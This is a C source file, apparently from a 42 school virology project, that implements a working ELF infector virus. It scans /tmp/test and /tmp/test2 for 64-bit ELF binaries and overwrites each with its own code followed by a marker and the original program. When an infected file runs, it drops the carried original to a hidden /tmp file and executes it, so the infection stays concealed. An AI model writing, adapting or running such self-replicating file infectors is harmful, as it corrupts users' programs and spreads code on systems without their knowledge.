/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/03/17 19:56:28 by jguyet            #+#    #+#             */
/*   Updated: 2018/03/17 19:56:30 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

void	infect_elf(char *argv, char *file_path)
{
	t_elf *elf;
	static char hello[] = "jguyet-frmarinh\0";

	elf = read_elf(file_path);
	if (elf == NULL)
		return ;
	char	*data = write_elf(elf);
	int		fd = open(file_path, O_RDWR | O_CREAT | O_TRUNC, S_IRWXU);

	if (fd > 0) {
		int infect_fd = open (argv, O_RDONLY);
		int len = lseek(infect_fd, 0, SEEK_END);

		if (infect_fd > 0 && len > 0) {
			char	*base_infection = ft_mmap(infect_fd, len);
			int		infected = find_pattern(base_infection, len);
			char	path[] = { PATH };
			len = (infected != 0) ? infected - sizeof(path): len;
			if (base_infection)
			{
				char path[] = { PATH };
				int final_len = len + elf->len + sizeof(path);
				char *new_file = malloc(final_len);
				if (new_file) {
					memcpy(new_file, base_infection, len);
					memcpy(new_file + len, (char*)&path, sizeof(path));
					memcpy(new_file + len + sizeof(path), data, elf->len);
					write(fd, new_file, final_len);
				}
				munmap(base_infection, len);
			}
		}
	}
	free(data);
	destruct_elf(elf);
}

int 	infect_folder(char *argv, char *path)
{
	char **files = get_elf_files(NULL, path, ELF_64);
	int i = 0;

	while (i < (int)array_length(files))
	{
		if (strcmp(argv, files[i]) == 0)
		{
			i++;
			continue ;
		}
		infect_elf(argv, files[i]);
		i++;
	}
}

bool	is_pattern(char *file, int index, int len)
{
	char	path[] = { PATH };
	int		l = index + sizeof(path);
	int		i = 0;

	if (l > len) {
		return false;
	}
	while (i < sizeof(path))
	{
		if (file[index++] != path[i]) {
			return false;
		}
		i++;
	}
	return true;
}

int find_pattern(char *file, int len)
{
	int		i = 0;
	char	path[] = { PATH };

	while (i < len)
	{
		if (file[i] == path[0] && is_pattern(file, i, len)) {
			return i + sizeof(path);
		}
		i++;
	}
	return 0;
}


char	*get_only_name(char *name)
{
	if (strstr(name, "/") != NULL)
	{
		int i = strlen(name) - 1;
		while (i > 0 && name[i] != '/')
			i--;
		return (name + (i + 1));
	}
	return name;
}

void	run_process(char *name, char **argv, char **env)
{
	int fd = 0;
	if ((fd = open(name, O_RDONLY)) <= 0)
		return;
	int len = lseek(fd, 0, SEEK_END);
	if (fd > 0 && len > 0) {
		char *file = ft_mmap(fd, len);
		if (file) {
			int offset = find_pattern(file, len);
			if (offset != 0) {
				int binary_len = len - offset;
				void *binary = NULL;
			    if ((binary = mmap (0,binary_len,PROT_READ|PROT_WRITE|PROT_EXEC,
			                MAP_PRIVATE|MAP_ANON,-1,0)) == NULL)
					return;
				memset(binary, 0, binary_len);
				memcpy(binary, file + offset, binary_len);
				if (binary) {
					memcpy(binary, file + offset, binary_len);
					char path[124] = "\0";
					memset(&path, 0, 123);
					snprintf(path, 123, "/tmp/.%s.%d", get_only_name(name), fd);
					int process_fd = open(path, O_RDWR | O_CREAT | O_TRUNC, S_IRWXU);

					if (process_fd) {
						if (write(process_fd, binary, binary_len) > 0) {
							close(process_fd);
							execve(path, argv, env);
						}
					}
				}
				munmap(binary, binary_len);
			}
			munmap(file, len);
		}
	}
}

int		main(int argc, char **argv, char **env)
{
	(void)argc;
	infect_folder(argv[0], "/tmp/test");
	infect_folder(argv[0], "/tmp/test2");

	run_process(argv[0], argv, env);
	return (0);
}
